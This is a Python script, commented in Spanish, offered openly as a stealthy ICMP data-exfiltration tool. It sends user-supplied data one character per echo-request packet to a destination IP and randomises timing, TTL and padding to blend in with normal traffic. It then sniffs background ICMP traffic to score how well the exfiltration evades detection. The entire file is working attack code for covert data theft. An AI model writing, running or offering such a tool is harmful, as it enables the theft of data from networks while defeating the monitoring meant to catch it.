#!/usr/bin/env python3
"""
Programa de exfiltración de datos mediante paquetes ICMP request sigilosa.
Requiere permisos de superusuario para ejecutarse.
"""

import os
import sys
import time
import random
import logging
from scapy.all import *
from scapy.layers.inet import IP, ICMP
from datetime import datetime

# Configuración de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def validate_root():
    """Verifica que el script se ejecute con permisos de superusuario"""
    if os.geteuid() != 0:
        logger.error("Este programa requiere permisos de superusuario. Ejecuta con sudo.")
        sys.exit(1)

def capture_background_icmp(count=3, timeout=5):
    """
    Captura paquetes ICMP de fondo para análisis comparativo.
    
    Args:
        count: Número de paquetes a capturar
        timeout: Tiempo máximo de captura en segundos
    
    Returns:
        Lista de paquetes ICMP capturados
    """
    logger.info(f"Capturando {count} paquetes ICMP de fondo...")
    try:
        # Filtramos solo paquetes ICMP request (tipo 8)
        packets = sniff(filter="icmp and icmp[0] == 8", count=count, timeout=timeout)
        return packets
    except Exception as e:
        logger.error(f"Error capturando paquetes de fondo: {e}")
        return []

def send_stealth_icmp(data, destination):
    """
    Envía datos de forma sigilosa mediante paquetes ICMP request.
    
    Args:
        data: String con los datos a exfiltrar
        destination: Dirección IP de destino
    
    Returns:
        Lista con información sobre los paquetes enviados
    """
    sent_packets = []
    
    for char in data:
        try:
            # Técnicas de stealth:
            # 1. Intervalo de tiempo aleatorio entre envíos
            delay = random.uniform(0.5, 3.0)
            time.sleep(delay)
            
            # 2. TTL aleatorio entre 50-255
            ttl = random.randint(50, 255)
            
            # 3. Tamaño de paquete variable (agregando padding aleatorio)
            padding_size = random.randint(0, 32)
            padding = bytes([random.randint(0, 255) for _ in range(padding_size)])
            
            # 4. Timestamp legítimo
            timestamp = datetime.now().isoformat()
            
            # Construcción del paquete ICMP
            # El carácter a exfiltrar se coloca en los datos del paquete
            payload = char.encode() + padding
            
            packet = IP(dst=destination, ttl=ttl)/ICMP()/payload
            
            # Envío del paquete
            send_time = datetime.now()
            send(packet, verbose=False)
            
            # Registro de información del paquete enviado
            packet_info = {
                'timestamp': send_time,
                'src': packet[IP].src,
                'dst': packet[IP].dst,
                'ttl': ttl,
                'size': len(packet),
                'char': char,
                'delay': delay
            }
            
            sent_packets.append(packet_info)
            logger.info(f"Enviado: {char} | TTL: {ttl} | Size: {len(packet)} | Delay: {delay:.2f}s")
            
        except Exception as e:
            logger.error(f"Error enviando paquete: {e}")
            # Continuamos con el siguiente carácter a pesar del error
    
    return sent_packets

def analyze_traffic_similarity(background_packets, sent_packets):
    """
    Realiza análisis comparativo entre el tráfico de fondo y el tráfico enviado.
    
    Args:
        background_packets: Paquetes ICMP de fondo capturados
        sent_packets: Información de los paquetes enviados
    
    Returns:
        Diccionario con estadísticas de similitud
    """
    if not background_packets or not sent_packets:
        return {"error": "Datos insuficientes para análisis"}
    
    # Estadísticas de paquetes de fondo
    bg_ttls = [pkt[IP].ttl for pkt in background_packets if IP in pkt]
    bg_sizes = [len(pkt) for pkt in background_packets]
    
    # Calcular intervalos temporales entre paquetes de fondo
    bg_timestamps = [pkt.time for pkt in background_packets]
    bg_intervals = [bg_timestamps[i+1] - bg_timestamps[i] for i in range(len(bg_timestamps)-1)]
    
    # Estadísticas de paquetes enviados
    sent_ttls = [pkt['ttl'] for pkt in sent_packets]
    sent_sizes = [pkt['size'] for pkt in sent_packets]
    sent_intervals = [pkt['delay'] for pkt in sent_packets[1:]]  # El primer paquete no tiene intervalo
    
    # Cálculo de similitudes
    def calculate_similarity(background, sent):
        if not background or not sent:
            return 0
        
        bg_avg = sum(background) / len(background)
        sent_avg = sum(sent) / len(sent)
        
        # Similitud basada en la proximidad de promedios
        similarity = 1 - (abs(bg_avg - sent_avg) / max(bg_avg, sent_avg))
        return max(0, min(1, similarity))  # Aseguramos valor entre 0 y 1
    
    # Calcular similitudes
    ttl_similarity = calculate_similarity(bg_ttls, sent_ttls)
    size_similarity = calculate_similarity(bg_sizes, sent_sizes)
    
    # Para intervalos, solo comparamos si tenemos suficientes datos
    if bg_intervals and sent_intervals:
        interval_similarity = calculate_similarity(bg_intervals, sent_intervals)
    else:
        interval_similarity = 0
    
    # Calcular similitud general (promedio ponderado)
    overall_similarity = (ttl_similarity + size_similarity + interval_similarity) / 3
    
    return {
        'ttl_similarity': ttl_similarity,
        'size_similarity': size_similarity,
        'interval_similarity': interval_similarity,
        'overall_similarity': overall_similarity,
        'background_stats': {
            'ttl_avg': sum(bg_ttls) / len(bg_ttls) if bg_ttls else 0,
            'size_avg': sum(bg_sizes) / len(bg_sizes) if bg_sizes else 0,
            'interval_avg': sum(bg_intervals) / len(bg_intervals) if bg_intervals else 0
        },
        'sent_stats': {
            'ttl_avg': sum(sent_ttls) / len(sent_ttls) if sent_ttls else 0,
            'size_avg': sum(sent_sizes) / len(sent_sizes) if sent_sizes else 0,
            'interval_avg': sum(sent_intervals) / len(sent_intervals) if sent_intervals else 0
        }
    }

def display_packet_info(packets, title, is_background=True):
    """
    Muestra información sobre paquetes en formato tabular.
    
    Args:
        packets: Lista de paquetes o información de paquetes
        title: Título para la sección
        is_background: True si son paquetes de fondo, False si son enviados
    """
    print(f"\n{'='*80}")
    print(f"{title:^80}")
    print(f"{'='*80}")
    
    if not packets:
        print("No hay paquetes para mostrar")
        return
    
    # Encabezado de la tabla
    if is_background:
        print(f"{'Timestamp':<20} {'Source':<15} {'Destination':<15} {'TTL':<6} {'Size':<6}")
        print(f"{'-'*20} {'-'*15} {'-'*15} {'-'*6} {'-'*6}")
    else:
        print(f"{'Timestamp':<20} {'Source':<15} {'Destination':<15} {'TTL':<6} {'Size':<6} {'Char':<5}")
        print(f"{'-'*20} {'-'*15} {'-'*15} {'-'*6} {'-'*6} {'-'*5}")
    
    # Contenido de la tabla
    for pkt in packets:
        if is_background:
            if IP in pkt:
                timestamp = datetime.fromtimestamp(pkt.time).strftime('%Y-%m-%d %H:%M:%S')
                src = pkt[IP].src
                dst = pkt[IP].dst
                ttl = pkt[IP].ttl
                size = len(pkt)
                print(f"{timestamp:<20} {src:<15} {dst:<15} {ttl:<6} {size:<6}")
        else:
            timestamp = pkt['timestamp'].strftime('%Y-%m-%d %H:%M:%S')
            src = pkt['src']
            dst = pkt['dst']
            ttl = pkt['ttl']
            size = pkt['size']
            char = pkt['char']
            print(f"{timestamp:<20} {src:<15} {dst:<15} {ttl:<6} {size:<6} {char:<5}")

def main():
    """Función principal del programa"""
    # Validar permisos de superusuario
    validate_root()
    
    # Solicitar datos de entrada
    if len(sys.argv) > 1:
        data = sys.argv[1]
    else:
        data = input("Introduce los datos a exfiltrar: ")
    
    if not data:
        logger.error("No se proporcionaron datos para exfiltrar")
        sys.exit(1)
    
    # Solicitar destino
    destination = input("Introduce la dirección IP de destino (enter para localhost): ").strip()
    if not destination:
        destination = "127.0.0.1"
    
    logger.info(f"Iniciando exfiltración de '{data}' hacia {destination}")
    
    try:
        # 1. Capturar paquetes ICMP de fondo antes del envío
        background_before = capture_background_icmp(count=3, timeout=5)
        
        # 2. Enviar datos de forma sigilosa
        sent_packets = send_stealth_icmp(data, destination)
        
        # Pequeña pausa antes de capturar tráfico de fondo posterior
        time.sleep(2)
        
        # 3. Capturar paquetes ICMP de fondo después del envío
        background_after = capture_background_icmp(count=3, timeout=5)
        
        # 4. Mostrar evidencia del tráfico
        display_packet_info(background_before, "PAQUETES ICMP DE FONDO (ANTES)")
        display_packet_info(sent_packets, "PAQUETES ENVIADOS", is_background=False)
        display_packet_info(background_after, "PAQUETES ICMP DE FONDO (DESPUÉS)")
        
        # 5. Análisis comparativo
        all_background = background_before + background_after
        analysis = analyze_traffic_similarity(all_background, sent_packets)
        
        print(f"\n{'='*80}")
        print(f"{'ANÁLISIS COMPARATIVO':^80}")
        print(f"{'='*80}")
        
        if 'error' in analysis:
            print(f"Error en el análisis: {analysis['error']}")
        else:
            print(f"Similitud en TTL: {analysis['ttl_similarity']*100:.2f}%")
            print(f"Similitud en tamaño: {analysis['size_similarity']*100:.2f}%")
            print(f"Similitud en intervalos: {analysis['interval_similarity']*100:.2f}%")
            print(f"Similitud general: {analysis['overall_similarity']*100:.2f}%")
            
            print(f"\nEstadísticas de fondo - TTL: {analysis['background_stats']['ttl_avg']:.2f}, "
                  f"Tamaño: {analysis['background_stats']['size_avg']:.2f}, "
                  f"Intervalo: {analysis['background_stats']['interval_avg']:.2f}s")
            
            print(f"Estadísticas enviados - TTL: {analysis['sent_stats']['ttl_avg']:.2f}, "
                  f"Tamaño: {analysis['sent_stats']['size_avg']:.2f}, "
                  f"Intervalo: {analysis['sent_stats']['interval_avg']:.2f}s")
            
            # Evaluación de stealth
            if analysis['overall_similarity'] > 0.7:
                print("\n✅ El tráfico es muy similar al legítimo (stealth efectivo)")
            elif analysis['overall_similarity'] > 0.5:
                print("\n⚠️  El tráfico tiene similitud moderada con el legítimo")
            else:
                print("\n❌ El tráfico es distinguishable del legítimo")
    
    except KeyboardInterrupt:
        logger.info("Ejecución interrumpida por el usuario")
    except Exception as e:
        logger.error(f"Error durante la ejecución: {e}")
    finally:
        logger.info("Programa terminado")

if __name__ == "__main__":
    main()